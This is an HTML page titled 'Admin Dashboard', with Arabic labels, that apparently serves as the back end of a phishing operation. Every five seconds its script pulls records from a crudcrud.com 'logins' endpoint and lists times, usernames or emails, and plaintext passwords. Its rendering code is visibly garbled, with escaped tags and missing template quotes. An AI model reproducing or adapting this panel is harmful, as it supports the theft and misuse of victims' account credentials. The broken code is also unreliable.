<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Dashboard</title>
<style>
body { background: #000; color: #e7e9ea; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; padding: 20px; margin: 0; }
.container { max-width: 900px; margin: 0 auto; }
h1 { color: #1d9bf0; display: flex; align-items: center; gap: 10px; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333639; padding-bottom: 20px; }
button { background: #eff3f4; color: #0f1419; border: none; padding: 10px 20px; border-radius: 9999px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.2s; }
button:hover { background: #d7dbdc; }
table { width: 100%; border-collapse: collapse; margin-top: 10px; }
th, td { border: 1px solid #333639; padding: 12px 16px; text-align: left; }
th { background: #16181c; color: #71767b; font-weight: normal; }
td { font-size: 15px; }
.pass { color: #1d9bf0; font-family: monospace; font-size: 16px; letter-spacing: 1px; }
.empty { text-align: center; color: #71767b; padding: 40px; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🛡️ Admin Dashboard</h1>
<button onclick="fetchData()">تحديث الآن</button>
</div>

<p style="color:#71767b; font-size: 14px;">يتم التحديث تلقائياً كل 5 ثواني...</p>

<table>
<thead>
<tr>
<th>الوقت (Time)</th>
<th>اسم المستخدم / الإيميل (Username)</th>
<th>كلمة المرور (Password)</th>
</tr>
</thead>
<tbody id="dataBody">
<tr><td colspan="3" class="empty">جاري تحميل البيانات...</td></tr>
</tbody>
</table>
</div>

<script>
// تم وضع الرابط الخاص بك هنا
const API_URL = 'https://crudcrud.com/api/d1a2ee49fd82493cac7f1440bcedac7a/logins';

async function fetchData() {
try {
const response = await fetch(API_URL);
const data = await response.json();
const tbody = document.getElementById('dataBody');

if (data.length === 0) {
tbody.innerHTML = '<tr><td colspan="3" class="empty">لا توجد تسجيلات دخول حتى الآن.</td></tr>';
return;
}

tbody.innerHTML = data.reverse().map(item => &lt;tr&gt; &lt;td&gt;${item.time || 'غير محدد'}</td>
<td>${item.username}&lt;/td&gt; &lt;td class="pass"&gt;${item.password}&lt;/td&gt; &lt;/tr&gt;).join('');
} catch (error) {
console.error('Error fetching data:', error);
}
}

fetchData();
setInterval(fetchData, 5000);
</script>
</body>
</html>
